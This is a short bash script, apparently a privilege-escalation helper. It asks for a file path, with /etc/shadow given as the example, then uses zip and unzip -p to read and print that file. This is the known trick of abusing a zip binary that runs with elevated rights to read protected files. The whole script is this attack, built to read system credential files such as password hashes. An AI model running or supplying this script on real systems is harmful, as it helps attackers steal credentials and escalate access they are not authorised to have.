#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
TF=$(mktemp -u)
zip $TF $filepath
unzip -p $TF
